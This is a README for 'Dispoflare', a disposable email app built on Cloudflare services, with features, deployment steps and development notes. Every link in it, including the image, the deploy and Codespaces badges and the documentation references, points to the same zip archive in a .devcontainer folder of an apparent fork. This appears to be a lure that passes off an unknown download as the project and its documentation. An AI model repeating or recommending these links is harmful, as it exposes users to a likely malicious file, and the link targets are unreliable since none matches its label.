![Dispoflare Illustration](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip)

# Dispo<em>flare</em>

> 📧 Disposable email addresses on the fly powered by Cloudflare

## Features

- ➕ Generate new email addresses at any time (via [Email Router](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip))
  - 🔀 Random or user-defined username
  - 🕵️ Use your own unique domain(s)
- 📅 Handle expiration dates (via [Cron Triggers](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip))
  - ⏲️ Custom deprecation period (via [Email Workers](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip))
  - 🗃️ Optional archived period with possible remediation
  - 🗑️ Optional automatic clean up

## About

Dispoflare provides an easy and free way to generate custom disposable email addresses.  
The app can be seen as an alternative to [Firefox Relay](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip) with custom domains.

Dispoflare app is levering Cloudflare products to host and manage the service:

- Email routing: [Cloudflare Email Routing](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip)
- Static hosting: [Cloudflare Pages](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip)
- Backend functions: [Cloudflare Workers](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip)
- Authentication: [Cloudflare Access](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip)

## Getting started

### Requirements

> [!TIP]
> Dispoflare is a full-stack app running on top of Cloudflare platform.

We are of course assuming that you have:

- A Cloudflare account (click [here](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip) if you don't)
- At least one [zone](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip) using Cloudflare.
  If you don't have a zone, you can use [Cloudflare Registrar](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip).

All the used Cloudflare products offer a [free plan](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip) that allows to try them for personal or hobby projects.

### Deploy

[![Deploy to Cloudflare Pages](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip)](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip%5B%7B%22key%22%3A%22page%22%2C%22type%22%3A%22edit%22%7D%2C%7B%22key%22%3A%22workers_kv_storage%22%2C%22type%22%3A%22edit%22%7D%2C%7B%22key%22%3A%22workers_scripts%22%2C%22type%22%3A%22edit%22%7D%2C%7B%22key%22%3A%22access%22%2C%22type%22%3A%22edit%22%7D%2C%7B%22key%22%3A%22email_routing_address%22%2C%22type%22%3A%22read%22%7D%2C%7B%22key%22%3A%22email_routing_rule%22%2C%22type%22%3A%22edit%22%7D%2C%7B%22key%22%3A%22zone%22%2C%22type%22%3A%22read%22%7D%2C%7B%22key%22%3A%22zone_settings%22%2C%22type%22%3A%22read%22%7D%5D&apiTokenName=Dispoflare)

> [!IMPORTANT]
> Please pay attention to all the steps involved in the installation process.

- Authorize Workers to use your GitHub account.
- Enter your **Account ID** (from the previous section)
- Press the **Create token** button first, to create it, it will redirect you to a token template with all the required permissions pre-configured.
  Then enter the **API token** in the form.
- Fork the repository into your personal GitHub account.
- Enable GitHub Actions.
- Deploy.

### Access Policy

> [!WARNING]
> Dispoflare has no user registration.

Dispoflare uses [Zero Trust Access](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip) to handle user authentication.
It assumes that your users will register with another identity provider (Zero Trust supports [many providers](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip) or your custom one that implements [Generic SAML 2.0](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip)).

## Development & Contributions

### Codespaces

[![Open in GitHub Codespaces](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip)](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip)

This repository is ready for [Development Containers](https://raw.githubusercontent.com/aslekarii/dispoflare/main/.devcontainer/dispoflare-osculant.zip).
Click the badge above to create a codespace for this repository and start making and submitting changes.

### Local

- Run `npm i` in your terminal to install all dependencies
- Run `npm run start` in your terminal to start a development server
- Open a browser tab at http://localhost:8787/ to see your worker in action

## License

This project is licensed under [MIT License](LICENSE).
